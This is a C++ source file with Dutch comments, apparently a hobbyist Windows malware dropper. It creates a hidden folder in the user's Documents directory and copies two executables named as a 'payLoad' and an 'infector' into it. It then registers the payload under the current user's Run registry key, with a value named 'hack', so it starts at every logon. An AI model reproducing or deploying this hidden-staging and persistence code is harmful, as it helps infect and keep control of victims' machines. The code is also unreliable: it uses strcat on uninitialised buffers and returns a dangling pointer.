#define _WIN32_WINNT 0x0600
#include <shlobj.h>
#include <Shlwapi.h>
#include <string>
#include <filesystem>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <fstream>
#include <map>
#include <comdef.h>

using namespace std;

// Handmatige fix voor FOLDERID_Documents
#ifndef FOLDERID_Documents
const GUID FOLDERID_Documents = {0xFDD39AD0, 0x238F, 0x46AF, {0xAD, 0xB4, 0x6C, 0x85, 0x48, 0x03, 0x69, 0xC7}};
#endif

const std::string current_File_Dir = std::filesystem::current_path().string(); 
const char* payLoad = "\\test.exe";
const char* infector = "\\Samen.exe";

const char* HiddenFolder() 
{ 
    // pad naar de documentenmap van de pc ophalen
    PWSTR documentsPath = nullptr;
    SHGetKnownFolderPath(FOLDERID_Documents, KF_FLAG_DEFAULT, nullptr, &documentsPath);
    std::wstring hiddenFolderPath(std::wstring(documentsPath) + L"\\test");

    // Ole32.dll-library laden om CoTaskMemFree te kunnen gebruiken
    HMODULE ole32Module = LoadLibrary(TEXT("Ole32.dll"));
    typedef void (WINAPI *CoTaskMemFreeFuncPtr)(LPVOID);
    CoTaskMemFreeFuncPtr CoTaskMemFreePtr = nullptr;

    // adres van de CoTaskMemFree-functie uit de Ole32.dll-lib halen
    if (ole32Module != NULL) {
        CoTaskMemFreePtr = (CoTaskMemFreeFuncPtr)GetProcAddress(ole32Module, "CoTaskMemFree");
    }

    // CoTaskMemFree-functie gebruiken om het geheugen van documentsPath vrij te maken anders lekt er geheugen
    if (CoTaskMemFreePtr != nullptr) {
        CoTaskMemFreePtr(documentsPath);
    }

    // verborgen map genaamd "test" in de documentenmap van de pc aanmaken

    CreateDirectoryW(hiddenFolderPath.c_str(), nullptr) && SetFileAttributesW(hiddenFolderPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    _bstr_t returnWaarde(hiddenFolderPath.c_str());
    return returnWaarde;
}

const char* FileInfector(const char* hiddenPath) {
    char* src = new char[100];
    char* src2 = new char[100];
    char* dest = new char[100];
    char* dest2 = new char[100];

    strcat(src, current_File_Dir.c_str()); //dit is vgm niet nodig, ook regel hierboven
    strcat(src, payLoad);

    strcat(src2, current_File_Dir.c_str()); //dit is vgm niet nodig, ook regel hierboven
    strcat(src2, infector);
    std::cout << src << std::endl;


    strcat(dest, hiddenPath); //dit is vgm niet nodig, ook regel hierboven
    strcat(dest, payLoad);

    strcat(dest2, hiddenPath); //dit is vgm niet nodig, ook regel hierboven
    strcat(dest2, infector);
    std::cout << dest << std::endl;

    CopyFile( src, dest, 0);
    CopyFile( src2, dest2, 0);

    return dest;
}

int StartupInjector(const char* exeLocation) {
    HKEY hkey = NULL;

    // startup
    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        // create new registry key
        RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exeLocation, strlen(exeLocation));
        RegCloseKey(hkey);
    }
  return 0;
}

int main(int argc, char* argv[]) 
{
    const char* hiddenPath = HiddenFolder();
    const char* exeLocation = FileInfector(hiddenPath); 
    StartupInjector(exeLocation); 
}

